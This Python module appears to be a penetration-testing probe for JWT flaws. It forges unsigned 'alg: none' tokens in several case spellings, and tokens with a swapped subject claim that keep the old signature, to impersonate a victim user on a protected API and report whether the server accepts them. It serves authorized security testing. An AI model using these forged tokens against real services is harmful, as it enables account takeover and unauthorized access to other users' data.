"""Probing for JWT signature flaws - WSTG-SESS-10 "Signature Verification" and "The None Algorithm".

``probe_alg_none`` asks a protected endpoint three questions with tokens the tester builds:

1. Does it accept an UNSECURED token (``alg: none``, empty signature) for another user? That is the flaw: the
   server lets the token pick its own protection (RFC 8725 section 2.1). Several spellings are tried, because the
   WSTG notes that a filter blocking only the exact string ``none`` can be bypassed with ``NoNe`` - and that a
   compliant library must reject those spellings anyway (``alg`` is case-sensitive, RFC 7515 section 4.1.1).
2. Does it verify the signature at all? A valid token whose payload is changed but whose signature is kept must be
   refused.
3. Is the test even meaningful? The endpoint must refuse a request with no token, and accept the valid token.
   Otherwise the probe stops with an error instead of reporting "secure".

Run only against systems you own or have written permission to test; the tests use a loopback practice portal.
"""

from __future__ import annotations

import base64
import json
import time
from dataclasses import dataclass, field

import requests

SPELLINGS = ("none", "None", "NONE", "nOnE")
PROTECTED_PATH = "/api/me"


@dataclass
class AlgNoneResult:
    baseline_status: int  # status with no token at all
    accepted_spellings: list[str] = field(default_factory=list)  # spellings accepted as the victim
    tampered_rejected: bool = True  # a valid token with a changed payload and the old signature was refused
    victim_role: str | None = None  # role the API reported for the forged identity, when one was accepted
    vulnerable: bool = False  # an unsecured token was accepted, or the signature is not checked


def b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def b64url_json(obj: dict) -> str:
    return b64url_encode(json.dumps(obj, separators=(",", ":")).encode())


def get_token(base_url: str, email: str, password: str, timeout: float = 5) -> str:
    """Signs in with POST /api/login (JSON ``email`` and ``password``) and returns the ``token`` field.
    RuntimeError when sign-in fails."""
    r = requests.post(f"{base_url}/api/login", json={"email": email, "password": password}, timeout=timeout)
    if r.status_code != 200:
        raise RuntimeError(f"sign-in failed: {r.status_code} {r.text[:200]}")
    return r.json()["token"]


def forge_unsigned(claims: dict, alg: str = "none") -> str:
    """An unsecured JWT: header ``{"alg": alg, "typ": "JWT"}``, the claims, and an EMPTY signature - which is why
    the token ends with a dot."""
    return f"{b64url_json({'alg': alg, 'typ': 'JWT'})}.{b64url_json(claims)}."


def forge_tampered(token: str, changes: dict) -> str:
    """The same token with ``changes`` merged into its payload; the header and the OLD signature are kept."""
    header, payload, signature = token.split(".")
    claims = json.loads(base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4)))
    claims.update(changes)
    return f"{header}.{b64url_json(claims)}.{signature}"


def _call(base_url: str, token: str | None, timeout: float, path: str = PROTECTED_PATH) -> requests.Response:
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    return requests.get(f"{base_url}{path}", headers=headers, timeout=timeout)


def probe_alg_none(base_url: str, valid_token: str, victim_email: str, timeout: float = 5,
                   path: str = PROTECTED_PATH) -> AlgNoneResult:
    baseline = _call(base_url, None, timeout, path)
    if baseline.status_code not in (401, 403):
        raise RuntimeError(f"{path} answered {baseline.status_code} with no token: it does not "
                           "authenticate, so this probe cannot conclude anything")
    if _call(base_url, valid_token, timeout, path).status_code != 200:
        raise RuntimeError("the valid token was refused: fix the precondition before probing")
    result = AlgNoneResult(baseline.status_code)
    tampered = _call(base_url, forge_tampered(valid_token, {"sub": victim_email}), timeout, path)
    result.tampered_rejected = tampered.status_code in (401, 403)
    for spelling in SPELLINGS:
        forged = forge_unsigned({"sub": victim_email, "exp": int(time.time()) + 300}, alg=spelling)
        r = _call(base_url, forged, timeout, path)
        if r.status_code == 200 and r.json().get("email") == victim_email:
            result.accepted_spellings.append(spelling)
            result.victim_role = r.json().get("role")
    result.vulnerable = bool(result.accepted_spellings) or not result.tampered_rejected
    return result
